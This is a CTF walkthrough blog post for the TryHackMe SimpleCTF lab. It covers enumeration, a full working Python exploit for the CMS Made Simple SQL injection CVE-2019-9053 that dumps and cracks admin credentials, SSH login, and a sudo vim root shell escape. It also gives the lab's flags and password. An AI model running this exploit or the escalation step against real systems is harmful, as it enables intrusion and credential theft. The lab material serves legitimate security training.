---
title: "SimpleCTF TryHackMe Walkthrough"
seoTitle: "TryHackMe SimpleCTF Guide"
seoDescription: "Discover how to conquer the SimpleCTF challenge on TryHackMe with this step-by-step penetration testing guide"
datePublished: Sat Aug 30 2025 14:17:59 GMT+0000 (Coordinated Universal Time)
cuid: cmeycjjdd000r02jyfi9oabij
slug: simplectf-tryhackme-walkthrough
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756563314330/a2508843-fb8b-4653-92d2-90e096f00c34.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1756563330507/b3b64b81-e3e5-406d-b623-9117651ddcca.png
tags: hacking, ctf, tryhackme, ctf-writeup, tryhackme-walkthrough

---

## Overview

SimpleCTF is a beginner-friendly CTF challenge on TryHackMe that focuses on basic enumeration, exploitation of a CMS vulnerability, and privilege escalation. This walkthrough will guide you through the complete process of compromising the target machine.

**Target IP:** `10.10.151.165`

## Initial Setup

First, let's add the target IP to our `/etc/hosts` file for easier access:

```bash
sudo nano /etc/hosts
```

Add the following line:

```plaintext
10.10.151.165 simplectf.thm
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756563053017/66c43db5-bf79-4021-8773-70ed00bdcddf.png align="center")

## Enumeration

### NMAP Scan

Let's start with a comprehensive NMAP scan to identify open ports and services:

```bash
sudo nmap -p- -A simplectf.thm
```

**Results:**

* **Port 21/tcp** - FTP (vsftpd 3.0.3) with anonymous login allowed
    
* **Port 80/tcp** - HTTP (Apache httpd 2.4.18)
    
* **Port 2222/tcp** - SSH (OpenSSH 7.2p2)
    

### Service Analysis

#### FTP (Port 21)

* **Service:** vsftpd 3.0.3
    
* **Anonymous access:** Enabled
    
* **Vulnerability:** CVE-2021-30047 (CVSS: 7.5) - DoS vulnerability
    

#### HTTP (Port 80)

* **Service:** Apache httpd 2.4.18
    
* **robots.txt:** Contains `/openemr-5_0_1_3` entry
    

#### SSH (Port 2222)

* **Service:** OpenSSH 7.2p2
    
* **Vulnerability:** CVE-2016-6210 - Username enumeration via timing attacks
    

### Web Directory Discovery

Using dirsearch to enumerate web directories:

```bash
dirsearch -u http://simplectf.thm
```

**Key findings:**

* `/robots.txt` - Contains disallowed entries
    
* `/simple` - Redirects to a CMS installation
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756563156725/9ca6b1b3-1892-4fe2-ac8d-d30418d07413.png align="center")

### CMS Discovery

Navigating to `/simple` reveals a **CMS Made Simple** installation running version **2.2.8**.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756563177615/baccd879-1e90-4e84-8ec4-ccb2accf2de3.png align="center")

#### CMS Analysis

* **Version:** CMS Made Simple 2.2.8
    
* **Vulnerability:** CVE-2019-9053 - Unauthenticated blind time-based SQL injection
    

## Exploitation

### CMS Made Simple SQL Injection

The CMS Made Simple version 2.2.8 is vulnerable to CVE-2019-9053, which allows unauthenticated blind time-based SQL injection through the News module.

#### Exploit Code

```python
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print "[+] Specify an url target"
    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()

def beautify_print_try(value):
    global output
    print "\033c"
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print "\033c"
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print colored("[*] Now try to crack password")
    crack_password()

beautify_print()
```

#### Running the Exploit

```bash
python exploit.py -u http://simplectf.thm/simple/ -w /usr/share/wordlists/rockyou.txt
```

**Results:**

* **Username:** mitch
    
* **Email:** [admin@admin.com](mailto:admin@admin.com)
    
* **Password hash:** 0c01f4468bd75d7a84c7eb73846e8d96
    
* **Cracked password:** secret
    

### SSH Access

With the credentials obtained, we can now access the SSH service:

```bash
ssh -p 2222 mitch@simplectf.thm
```

Use the password `secret` when prompted.

## Post Exploitation

### Initial Enumeration

After gaining access, let's gather basic system information:

```bash
id
who
uname -a
```

**System Information:**

* User: mitch (uid=1001)
    
* OS: Ubuntu 16.04.1 LTS (Linux 4.15.0-58-generic)
    

### Privilege Escalation Vector

Check for sudo privileges:

```bash
sudo -l
```

**Result:** User mitch can run `/usr/bin/vim` as root without a password!

### User Flag

Navigate to the home directory and locate the user flag:

```bash
ls /home
```

**User flag:** `G00d j0b, keep up!`

### Root Privilege Escalation

Since we can run vim as root without a password, we can exploit this for privilege escalation:

```bash
sudo vim -c ':!/bin/sh'
```

This command:

1. Opens vim with sudo privileges
    
2. Executes the `:!/bin/sh` command, which spawns a shell
    
3. Since vim is running as root, the shell will also be root
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756563245622/7294f6c1-faf6-4245-994b-c778db74b411.png align="center")

### Root Flag

With root access, we can now retrieve the root flag:

**Root flag:** `W3ll d0n3. You made it!`

## Summary

This SimpleCTF challenge demonstrated several important penetration testing concepts:

1. **Enumeration:** Thorough port scanning and service identification
    
2. **Vulnerability Research:** Identifying CVE-2019-9053 in CMS Made Simple
    
3. **SQL Injection:** Exploiting time-based blind SQL injection
    
4. **Credential Reuse:** Using discovered credentials for SSH access
    
5. **Privilege Escalation:** Exploiting sudo permissions with vim
    

### Key Takeaways

* Always perform comprehensive enumeration
    
* Research known vulnerabilities for identified software versions
    
* Test for credential reuse across different services
    
* Check sudo permissions for potential privilege escalation vectors
    
* GTFOBins is an excellent resource for privilege escalation techniques
    

### Flags Collected

* **User Flag:** `G00d j0b, keep up!`
    
* **Root Flag:** `W3ll d0n3. You made it!`